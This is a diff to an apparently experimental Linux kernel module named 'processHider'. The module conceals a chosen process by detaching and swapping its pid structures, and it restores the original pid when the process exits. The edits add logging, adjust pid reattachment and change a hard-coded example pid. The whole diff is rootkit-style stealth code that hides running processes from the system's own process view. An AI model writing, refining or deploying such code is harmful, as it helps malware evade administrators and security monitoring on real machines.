@@ -22,6 +22,7 @@ static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type
 void free_pid(struct pid *pid);
 static int hideProcess(int pidNumber);
 
+//todo: group these to allow hiding multiple tasks..
 static void *hiddenTask = NULL;
 struct pid *oldPidToRestore = NULL;
 
@@ -35,10 +36,7 @@ int notificationFunction(struct notifier_block *notifierBlock, unsigned long unk
 			struct pid *pid = oldPidToRestore;
 			rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-			attach_pid(task, PIDTYPE_MAX, pid);
-			attach_pid(task, PIDTYPE_PGID, pid);
 			attach_pid(task, PIDTYPE_PID, pid);
-			attach_pid(task, PIDTYPE_SID, pid);
 
 			rcu_read_unlock();
 		}
@@ -61,7 +59,7 @@ struct notifier_block notificationOnProcessExit = {
 
 int processHider_init(void) {
 	//TODO: only hide proccess when wanted ...
-	//pid_t pid = 2404; //TODO: change this 
+	//pid_t pid = 22825; //TODO: change this
 	//hideProcess(pid); // todo: perhaps use result of function call..
 	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
 
@@ -100,6 +98,7 @@ static int hideProcess(int pidNumber) {
 	
 	{
 		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+		printInfo("hiding task");
 
 		if (hiddenTask != NULL) {
 			printInfo("warning another task was already hidden - this is not supported properly yet\n");
@@ -148,10 +147,12 @@ static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_ty
 	link->pid = new;
 
 	//TODO: store each old pid to enable them to be stored as is....
-	for (tmp = PIDTYPE_MAX; --tmp >= 0; )
-		if (!hlist_empty(&oldPid->tasks[tmp]))
+	for (tmp = PIDTYPE_MAX; --tmp >= 0; ) {
+		if (!hlist_empty(&oldPid->tasks[tmp])) {
+			printError("pid still in use / stopped early\n");
 			return oldPid;
-
+		}
+	}
 
 	// don't free so that it can be assigned again later
 	//free_pid(oldPid);
